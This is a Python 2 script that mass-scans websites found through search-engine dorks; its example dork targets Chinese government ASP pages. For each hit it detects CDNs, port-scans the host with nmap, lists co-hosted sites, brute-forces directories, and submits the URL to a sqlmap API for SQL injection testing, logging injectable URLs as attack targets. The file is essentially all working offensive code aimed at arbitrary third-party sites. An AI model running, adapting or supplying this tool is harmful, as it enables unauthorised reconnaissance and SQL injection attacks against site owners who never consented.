#!/usr/bin/env python
# encoding: utf-8
#!Create By David_Ning

import re,requests,BeautifulSoup
from bs4 import BeautifulSoup
from termcolor import colored
from urllib import quote
import pymongo
import urllib2
import json,time
import urlparse
import nmap
import string
import socket
import sys
import os

reload(sys)
sys.setdefaultencoding('utf-8')

sqlmap_server_ip_port = "http://127.0.0.1:9090"
header_dict = {}
header_dict['Content-Type']='application/json'
cant_connect_notice = u'connection timed out to the target URL or proxy. sqlmap is going to retry the request'

class Web_Vuln():
    web_vuln_ip='0.0.0.0'
    web_vuln_domain = 'www.domain.org'
    web_vuln_open_port_list=[]
    web_vuln_with_cdn_flag=0
    web_vuln_same_ip_web_list=[]
    web_vuln_sensitive_url_list=[]
    web_vuln_sqli_flag=0

    def __init__(self, url_test):
        self.url_test = url_test

    def Web_Vuln_Info_Save(self):
    	conn = pymongo.Connection('127.0.0.1',27017)
        db = conn.WebVulnInfo
        db.WebVulnInfo.save({\
            'ip':self.web_vuln_ip,\
            'domain':self.web_vuln_domain,\
            'open_port':self.web_vuln_open_port_list,\
            'cdn_flag':self.web_vuln_with_cdn_flag,\
            'same_ip_web':self.web_vuln_same_ip_web_list,\
            'sensitive_urls':self.web_vuln_sensitive_url_list,\
            'sqli_flag':self.web_vuln_sqli_flag})
        print colored('[+]Save To mongodb successfully!','green')

    def Super_Ping(self):
        print "[-]From diffent place ping the server.Wait..."
        superping_path_testing_url = urlparse.urlparse(self.url_test)
        superping_url_host_domain = superping_path_testing_url.netloc
        self.web_vuln_domain = superping_url_host_domain

        super_ping_id = ['489','490','491','492','493','494','495','496','497','498','499','500','501','502','503','504','505','506','507','508','509','510','511','512']
        super_ping_guid =  ['71e7b615-2c12-4857-8b6f-77c03ad6ef1c',
                            'bad6580f-377f-4933-9821-4ba8745e02c3',
                            'be09c5ce-3031-4565-8f6a-3e328e256e16',
                            'd3874081-fed1-4473-a395-3c26859e7e52',
                            'a7e5a0e9-e919-4008-99bc-78d82f8f63de',
                            '61d76c8c-b681-4196-b734-7d8e60f1e3ae',
                            '3ceb72a9-6e6d-45f5-8115-72c7825d0901',
                            '58ea53d2-201b-49e1-8823-0bc55dc9721e',
                            'cfcd6d68-897e-4d69-9507-ae34334145eb',
                            '24ed4cab-6650-47bc-8579-d3a8faa6481c',
                            '6afb0ae7-4d63-43e1-b8e1-fb33a6a7fe14',
                            '9d9fd3c5-1013-4a4c-93f2-33655fd8728a',
                            'e7100b00-abaf-410d-9248-5aeb3c46e12d',
                            '6a8e0159-31b5-4904-9986-9fefc0aabab9',
                            'c8a772cc-624e-479d-be58-85a3882cd7fa',
                            '54f7f313-1a14-4075-b52a-8513811541a6',
                            '38522b83-8893-4ca6-b45f-b6588b034462',
                            'bb541680-cee8-45ef-b5bc-8ba535af90cb',
                            'c98b634b-bc91-49d1-95aa-79b7fafe2c5b',
                            '5a7d164c-c166-4e05-a8a2-8ed574f2aa4b',
                            '68c324d3-1949-4055-84a7-2d920980d1e4',
                            'cdc9bf29-8bbf-4f82-9979-ac46f871b3bc',
                            '2e8e0e73-91cb-477a-9153-241d19bf51a1',
                            'd8c0d1d1-9da8-4480-a9df-555731cdd7b8']
        super_ping_header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
        'Accept':'text/html;q=0.9,*/*;q=0.8',
        'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
        'Accept-Encoding':'gzip',
        'Connection':'close',
        'Referer':'http://ping.chinaz.com'}

        super_ping_ip_list = []
        for i in xrange(0,15):
            superping_data = 'guid='+super_ping_guid[i]+'&host='+superping_url_host_domain+'&ishost=false&encode=so3govlgWKuJH3nwoVtiUvLHDGSl6HYi&checktype=0'
            superping_url = 'http://ping.chinaz.com/iframe.ashx?t=ping&callback=jQuery17109645657650210349_1431923437'+super_ping_id[i]

            super_ping_req = urllib2.Request(superping_url,super_ping_header)
            super_ping_soup = BeautifulSoup(urllib2.urlopen(super_ping_req,superping_data))

            ip_re_string = '(?<![\.\d])(?:\d{1,3}\.){3}\d{1,3}(?![\.\d])'
            super_ping_ip = re.findall(ip_re_string,str(super_ping_soup))
            super_ping_ip_list = super_ping_ip_list+super_ping_ip

        print colored("[*]Super_Pings Results:",'green')
        for i in super_ping_ip_list:
            print "->"+i
        tmp_list = list(set(super_ping_ip_list))
        if len(tmp_list)<2:
            print colored('[*]Perhaps The Server WithOut CDN!','green')
            self.web_vuln_with_cdn_flag = 0
        else:
            print colored('[*]The Server Look Like Have CDN!','red')
            self.web_vuln_with_cdn_flag = 1

    def Port_Scan(self):
        path_testing_url = urlparse.urlparse(self.url_test)
        url_host_domain = path_testing_url.netloc
        url_host_ipv4 = socket.getaddrinfo(url_host_domain,'http')[0][4][0]
        self.web_vuln_ip = url_host_ipv4

        scan_port_list = '21,22,23,53,80,135,137,138,139,443,873,1433,1521,3389,8080,8088,8089'
        nm = nmap.PortScanner()
        print "[-]Port Scanning.Wait..."
        scan_results = nm.scan(url_host_ipv4, scan_port_list)
        scan_ports = string.split(scan_port_list,',')
        print "[*]This Web_Server IPv4:"+colored(url_host_ipv4,'green')
        for i in scan_ports:
            if nm[url_host_ipv4]['tcp'][int(i)]['state'] == 'open':
                print "[+]The Server Open Port:"+colored(i,'green')
                self.web_vuln_open_port_list.append(i)

    def Same_IP_Web(self):
        query_path_testing_url = urlparse.urlparse(self.url_test)
        query_url_host_domain = query_path_testing_url.netloc
        query_url_host_ipv4 = socket.getaddrinfo(query_url_host_domain,'http')[0][4][0]

        query_domain_url = 'http://s.tool.chinaz.com/same'
        ip_data = 's='+query_url_host_ipv4

        query_domain_header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
        'Accept':'text/html;q=0.9,*/*;q=0.8',
        'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
        'Accept-Encoding':'gzip',
        'Connection':'close',
        'Referer':'http://s.tool.chinaz.com/same'}

        query_req = urllib2.Request(query_domain_url,query_domain_header)
        query_soup = BeautifulSoup(urllib2.urlopen(query_req,ip_data))

        re_string = 'http://.*?"'
        http_domains_list = re.findall(re_string,str(query_soup.findAll(attrs={'id':'contenthtml'})))

        if not http_domains_list == []:
            print colored("[*]All The Web_server On this IP:"+query_url_host_ipv4,'red')
            for i in http_domains_list:
                print colored(i[0:-1],'green')
                self.web_vuln_same_ip_web_list.append(i[0:-1])
        else:
            print colored("[-]Have No Other Web_server On this IP:(",'yellow')
            self.web_vuln_same_ip_web_list=[]

    def Dir_Scan(self):
        print "[-]Ready Scan Dirs..."
        file_name_tmp = ''

        path_testing_url = urlparse.urlparse(self.url_test)
        path_list = string.split(path_testing_url.path,'/')
        file_type = string.split(path_list[-1],'.')[-1]

        dir_scan_header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
        'Accept':'text/html;q=0.9,*/*;q=0.8',
        'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
        'Accept-Encoding':'gzip',
        'Connection':'close',
        'Referer':'http://'+path_testing_url.netloc}

        type_fd = open(os.getcwd()+'/dic/'+file_type.lower()+'.txt','r')
        dir_fd = open(os.getcwd()+'/dic/dir.txt','r')
        mdb_fd = open(os.getcwd()+'/dic/mdb.txt','r')

        file_type_list = type_fd.readlines()
        dir_list = dir_fd.readlines()
        mdb_list = mdb_fd.readlines()

        all_guess_list = list(set(file_type_list+dir_list+mdb_list))

        print "[-]Dirs_Guess Scaning\n[-]Please Wait(about 4-5 mins if NetWork Best)..."
        cheat_times = 0
        connect_wrong_times = 0

        for j in all_guess_list:
            j=j.strip('\r\n')
            path_test = path_testing_url.scheme+"://"+path_testing_url.netloc+quote(j)
            try:
                dir_scan_r = requests.get(path_test,headers=dir_scan_header,timeout=10,verify=False)
                if dir_scan_r.status_code == 200:
                    cheat_times = cheat_times+1
                    print "[*]R_code'200'_Url-----$$"+colored(path_test,'red')
                    self.web_vuln_sensitive_url_list.append("200_url:"+path_test)
                    if cheat_times >= 45:
                        print colored("[!]Oh..David.Perhaps We are be cheated!\n[!]Stop to ScanDirs!",'yellow')
                        self.web_vuln_sensitive_url_list=[]
                        break
                elif dir_scan_r.status_code == 302:
                    print "[*]R_code'302'_Url-----$$"+colored(path_test,'yellow')
                    self.web_vuln_sensitive_url_list.append("302_url:"+path_test)
                    cheat_times = cheat_times+1
                    if cheat_times >= 45:
                        print colored("[!]Oh..David.Perhaps We are be cheated!\n[!]Stop to ScanDirs!",'yellow')
                        self.web_vuln_sensitive_url_list=[]
                        break
                elif dir_scan_r.status_code == 403:
                    cheat_times =cheat_times+1
                    print "[*]R_code'403'_Url-----$$"+colored(path_test,'yellow')
                    self.web_vuln_sensitive_url_list.append("403_url:"+path_test)
                    if cheat_times >= 45:
                        print colored("[!]Oh..David.Perhaps We are be cheated!\nStop to ScanDirs!",'yellow')
                        self.web_vuln_sensitive_url_list=[]
                        break
            except Exception, e:
                print "[!]Dir_Scan_Process some connect wrong."
                connect_wrong_times = connect_wrong_times+1
                if connect_wrong_times >= 20:
                    print colored("[!]Too Many Connect Problem.Stop Scan Dirs!",'red')
                    break
        print "[-]Dirs_Guess Scan Done!"
        mdb_fd.close()
        dir_fd.close()
        type_fd.close()

    def SQLi_Scan(self):
        scan_data = {}
        scan_data['url'] = self.url_test

        s=requests.get(sqlmap_server_ip_port+"/task/new")
        if s.json()['success'] == True :
            taskid = s.json()['taskid']
            print colored("[=]new task success.Task_id:"+taskid,'green')
        s=requests.post(sqlmap_server_ip_port+"/scan/"+taskid+"/start",data=json.dumps(scan_data),headers=header_dict)
        if s.json()['success'] == True :
            print colored("[=]task start successfully.",'green')

        s=requests.get(sqlmap_server_ip_port+"/scan/"+taskid+"/status")
        while not (s.json()['status'] == 'terminated'):
            print "[-]sqlinject scanning..."
            j=0
            time.sleep(30)
            s=requests.get(sqlmap_server_ip_port+"/scan/"+taskid+"/status")

            scan_log_pre = requests.get(sqlmap_server_ip_port+"/scan/"+taskid+"/log")
            scan_log = scan_log_pre.json()[u'log']

            for i in scan_log:
                if cant_connect_notice in i['message']:
                    j=j+1
                    if j>3:
                        print colored("[*]Sqlmap_Scan_Process Can't Connect Target!",'yellow')
                        self.web_vuln_sqli_flag = 2
                        break
            if j>3:
                break

        if s.json()['status'] == 'terminated':
            print colored("[+]sqlinject scanning terminated successfully.",'green')

        s=requests.get("http://127.0.0.1:9090/scan/"+str(taskid)+"/data")
        if not bool(s.json()[u'data']==[]):
            print "[!]Hey!I Find SQLinject Url!-----$$"+colored(url_test,'red')
            self.web_vuln_sqli_flag = 1
            fd0 = open("SQLinject_Urls.txt",'a')
            fd0.writelines(url_test+'\n')
            fd0.close()
        else:
            self.web_vuln_sqli_flag = 0

if __name__ == '__main__' :

    keyword = raw_input("Input some keyword.\n'For example,site:.gov.cn inurl:.asp?id='\n|--->")
    search_url_count = raw_input("How many urls you wanna to search?(10<n<50)\n n = ")
    page_number = raw_input("Search Url Page Number(1<m<20)?\n page_number = ")
    search_url = "http://www.baidu.com/s?wd="+keyword+"&cl=3&rn="+str(search_url_count)+"&pn="+str(page_number)

    r = requests.get(search_url,timeout=25,verify=False)
    soup = BeautifulSoup(r.text)
    pre_urls = soup.findAll(attrs={'class':'t'})

    waiting_test_urls=[]
    re_string = 'http://.*?"'

    for pre_url in pre_urls:
        tmp_url = re.findall(re_string,str(pre_url))
        for i in tmp_url:
            i = i[0:-1]
            waiting_test_urls.append(i)

    test_urls=[]
    for i in waiting_test_urls:
        try:
            j = requests.get(i,timeout=15,verify=False)
            if j.status_code == 200:
                test_urls.append(j.url)
        except Exception, e:
            print colored("[!]Test_Url_Connect_Stability_Process Time Out!",'yellow')
    test_urls = list(set(test_urls))
    print "[+]Find Urls Counts:"+colored(str(len(test_urls)),"green")

    for i in test_urls:
        testing_url = url_status_code =''
        try:
            r = requests.get(i,timeout=20,verify=False)
            testing_url = r.url
            url_status_code = str(r.status_code)
        except Exception, e:
            print colored("[!]Ready_Test_Process Time Out!","yellow")

        print "[+]Attack Target Url:"+colored(testing_url,'green')
        print "[+]Response Code:"+colored(url_status_code,'green')

        testing_url_urlparse = urlparse.urlparse(testing_url)
        if (url_status_code == '200') and ('?' in testing_url) and (string.split(string.split(testing_url_urlparse.path,'/')[-1],'.')[-1] in ['asp','aspx','jsp','php']):
            Get_vuln = Web_Vuln(testing_url)
            Get_vuln.Super_Ping()
            Get_vuln.Port_Scan()
            Get_vuln.Same_IP_Web()
            Get_vuln.Dir_Scan()
            Get_vuln.SQLi_Scan()
#            Get_vuln.Web_Vuln_Info_Save()
    print colored("[$]Job Done!","green")




